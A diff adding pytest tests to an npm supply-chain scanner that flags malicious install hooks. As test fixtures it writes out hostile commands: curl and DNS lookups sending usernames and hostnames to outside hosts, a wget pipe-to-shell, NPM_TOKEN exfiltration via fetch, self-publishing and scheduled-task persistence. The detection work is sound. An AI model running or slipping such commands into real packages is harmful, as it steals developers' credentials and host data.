@@ -116,3 +116,147 @@ def test_symlink_rejected():
 def test_not_a_tarball_rejected():
     with pytest.raises(UnsafeArchive):
         extract_in_memory(b"this is not gzip")
+
+
+# ---------- install commands, large install entries, destinations (synthetic, inert text) ----------
+
+from tracii.detect import static_rules as _sr  # noqa: E402
+from tracii.intake.npm_registry import PackageFiles  # noqa: E402
+
+
+def _pkg(scripts=None, files=None, large=None):
+    return PackageFiles(name="p", version="1.0.0", manifest={"scripts": scripts or {}}, files=files or {}, large=large or {})
+
+
+def _flagged(findings):
+    return {f.rule_or_advisory: f.severity.value for f in findings if f.severity.value in ("critical", "high", "medium")}
+
+
+def test_hook_command_payloads():
+    exfil = _pkg({"preinstall": 'curl -s "http://203.0.113.9/?u=$(whoami)&h=$(hostname)"'})
+    assert _flagged(_sr.analyze_package(exfil)) == {"TRACII-HOOK-CMD-EXFIL": "high"}
+    dns = _pkg({"install": """node -e "require('dns').lookup(require('os').userInfo().username + '.x.oast.fun', () => {})" """})
+    assert _flagged(_sr.analyze_package(dns)) == {"TRACII-HOOK-CMD-EXFIL": "high"}
+    assert _flagged(_sr.analyze_package(_pkg({"postinstall": "curl -sO https://example.org/a.txt"}))) == \
+        {"TRACII-HOOK-CMD-NET": "medium"}
+    piped = _pkg({"postinstall": "wget -qO- https://example.org/i.sh | sh"})
+    assert _flagged(_sr.analyze_package(piped)) == {"TRACII-HOOK-CMD-EXFIL": "high"}
+
+
+def test_benign_hook_commands_stay_quiet():
+    for cmd in ["node-gyp rebuild", "prebuild-install -r napi || node-gyp rebuild", "node-gyp-build",
+                """node -e "try{require('./postinstall')}catch(e){}" """, "tshy && bash build.sh",
+                "install-from-cache --artifact build/Release/re2.node --host-var RE2_DOWNLOAD_MIRROR"]:
+        assert _flagged(_sr.analyze_package(_pkg({"install": cmd}))) == {}, cmd
+
+
+def test_large_bundle_read_only_when_an_install_script_runs_it():
+    bundle = "x".join(["const h=require('os').hostname();require('https').request({hostname:'198.51.100.7'}).end(h);"]
+                      + ["a"] * 10)
+    run = _pkg({"postinstall": "node bundle.js"}, large={"bundle.js": bundle})
+    assert _flagged(_sr.analyze_package(run)) == {"TRACII-CHAIN-EXFIL": "high"}
+    assert _flagged(_sr.analyze_package(_pkg(large={"bundle.js": bundle}))) == {}   # not run at install: not read
+
+
+def test_named_config_env_is_not_an_exfil_source():
+    src = "const p = process.env.ESBUILD_BINARY_PATH;\nconst cp = require('child_process');\ncp.execSync('x')"
+    f = _sr.analyze_package(_pkg({"postinstall": "node install.js"}, {"install.js": src}))
+    assert _flagged(f) == {"TRACII-INSTALL-NET-EXEC": "medium"}
+    secret = "const t = process.env.NPM_TOKEN;\nfetch('https://example.org', {body: t})"
+    assert "TRACII-CHAIN-EXFIL" in _flagged(_sr.analyze_package(_pkg({"postinstall": "node i.js"}, {"i.js": secret})))
+
+
+def test_destination_decides_install_download_severity():
+    dl = "if (process.env.CI) {}\nrequire('https').get('https://registry.npmjs.org/@x/bin/-/bin.tgz', r => r)"
+    f = _sr.analyze_package(_pkg({"postinstall": "node install.js"}, {"install.js": dl}))
+    assert _flagged(f) == {} and any(x.severity.value == "low" for x in f)   # still reported, not flagged
+    bad = "require('https').get('https://203.0.113.5/payload', r => r)"
+    assert _flagged(_sr.analyze_package(_pkg({"postinstall": "node i.js"}, {"i.js": bad}))) == \
+        {"TRACII-INSTALL-NET-EXEC": "high"}
+    assert _sr.suspicious_hosts({"127.0.0.1", "10.0.0.2", "github.com", "a.b.oastify.com", "8.8.8.8"}) == \
+        {"a.b.oastify.com", "8.8.8.8"}
+
+
+def test_extract_collects_large_js_only_on_request():
+    big = b"// " + b"a" * (1024 * 1024 + 10)
+    blob = make_tarball({"package/bundle.js": big, "package/index.js": b"1", "package/blob.bin": big})
+    large = {}
+    files, skipped = extract_in_memory(blob, large)
+    assert set(files) == {"index.js"} and set(skipped) == {"bundle.js", "blob.bin"} and set(large) == {"bundle.js"}
+    files2, _ = extract_in_memory(blob)
+    assert files2 == files
+
+
+def test_osv_mal_record_is_malware_not_a_vulnerability():
+    rec = {"id": "MAL-2025-1", "summary": "Malicious code in evil-pkg (npm)", "aliases": [],
+           "affected": [{"package": {"ecosystem": "npm", "name": "evil-pkg"},
+                         "ranges": [{"type": "SEMVER", "events": [{"introduced": "0"}]}]}]}
+    f = osv.vuln_to_finding(rec, "evil-pkg", "1.0.0", "osv-api")
+    assert f.category == Category.MALICIOUS_INDICATOR and f.severity.value == "critical"
+    assert f.confidence.value == "high" and f.fixed_versions == [] and f.title.startswith("Known malicious package")
+    assert any("Remove the package" in x for x in f.limitations)
+    normal = osv.vuln_to_finding({"id": "GHSA-x", "summary": "bug"}, "ok", "1.0.0", "osv-api")
+    assert normal.category == Category.VULNERABILITY
+
+
+def test_osv_mal_flows_into_gate_fix_and_sbom(demo_project, mock_http):
+    from tracii import gate
+    from tracii.export import sbom
+    from tracii.fix import remediation
+    from tracii.evidence.schema import ScanSource
+    from tracii.pipeline import STORE, run_scan
+    rec = STORE.new()
+    scan = run_scan(rec, ScanSource(kind="fixture", label="t"), *demo_project, http=mock_http(), deep_limit=0)
+    scan.findings = [osv.vuln_to_finding({"id": "MAL-2025-2", "summary": "Malicious code"}, "lodash", "4.17.20", "osv-api")]
+    assert remediation.propose_fix(scan.findings[0], scan.inventory, rec.package_json).kind == "manual_review"
+    g = gate.evaluate(scan, gate.GatePolicy(fail_on="critical"))
+    assert g.outcome == "fail" and g.blocking[0].rule_or_advisory == "MAL-2025-2"
+    assert "vulnerabilities" not in sbom.to_cyclonedx(scan, rec.package_json)
+
+
+def test_shell_command_inside_code():
+    src = "const cp = require('child_process');\ncp.execSync(`curl -s https://x.oast.fun/?h=$(hostname)`)"
+    assert _flagged(_sr.analyze_package(_pkg(files={"lib/a.js": src}))) == {"TRACII-CODE-SHELL-EXFIL": "high"}
+    plain = "const cp = require('child_process');\ncp.execSync('git rev-parse HEAD')"
+    assert _flagged(_sr.analyze_package(_pkg(files={"lib/a.js": plain}))) == {}
+
+
+def test_self_publish_only_when_actually_run():
+    run = "const { execSync } = require('child_process');\nexecSync('npm publish --access public')"
+    assert _flagged(_sr.analyze_package(_pkg(files={"auto.js": run}))) == {"TRACII-SELF-PUBLISH": "medium"}
+    comment = "// `npm publish` re-runs the prepare script\nmodule.exports = 1"
+    assert _flagged(_sr.analyze_package(_pkg(files={"c.js": comment}))) == {}
+
+
+def test_install_running_only_build_tools_is_low():
+    build = "const { spawn } = require('child_process');\nspawn('node-gyp', ['rebuild'])"
+    f = _sr.analyze_package(_pkg({"install": "node build.js"}, {"build.js": build}))
+    assert _flagged(f) == {} and any(x.severity.value == "low" and "node-gyp" in x.title for x in f)
+    mixed = "const { spawn, execSync } = require('child_process');\nspawn('node-gyp', ['rebuild'])\nexecSync('schtasks /create')"
+    assert _flagged(_sr.analyze_package(_pkg({"install": "node build.js"}, {"build.js": mixed}))) == \
+        {"TRACII-INSTALL-NET-EXEC": "medium"}
+    opaque = "const cp = require('child_process');\ncp.spawn(cmd, args)"   # command not visible: stays medium
+    assert _flagged(_sr.analyze_package(_pkg({"install": "node build.js"}, {"build.js": opaque}))) == \
+        {"TRACII-INSTALL-NET-EXEC": "medium"}
+
+
+def test_obfuscator_style_code_is_flagged_even_in_large_files():
+    obf = "var " + ",".join(f"_0x{i:04x}=1" for i in range(30)) + ";"
+    assert _flagged(_sr.analyze_package(_pkg(files={"lib/x.js": obf}))) == {"TRACII-OBFUSCATED-CODE": "medium"}
+    runs = _pkg(files={"package.json": "{}"}, large={"index.js": obf})
+    runs.manifest["main"] = "index.js"
+    assert _flagged(_sr.analyze_package(runs)) == {"TRACII-OBFUSCATED-CODE": "high"}
+    minified = "var a=1,b=2,c=function(d){return d};" * 500       # ordinary minified code
+    assert _flagged(_sr.analyze_package(_pkg(files={"m.js": minified}))) == {}
+
+
+def test_native_addon_install_build_is_low_but_hostile_commands_stay_flagged():
+    build = "const cp = require('child_process');\ncp.spawn(process.execPath, args)"
+    native = _pkg({"install": "node build.js"}, {"build.js": build, "binding.gyp": "{}"})
+    f = _sr.analyze_package(native)
+    assert _flagged(f) == {} and any("native addon" in x.title for x in f)
+    assert _flagged(_sr.analyze_package(_pkg({"install": "node build.js"}, {"build.js": build}))) == \
+        {"TRACII-INSTALL-NET-EXEC": "medium"}          # same code without binding.gyp: still flagged
+    hostile = "const cp = require('child_process');\ncp.execSync(`curl -s http://203.0.113.4/?u=$(whoami)`)"
+    assert "TRACII-CODE-SHELL-EXFIL" in _flagged(_sr.analyze_package(
+        _pkg({"install": "node build.js"}, {"build.js": hostile, "binding.gyp": "{}"})))
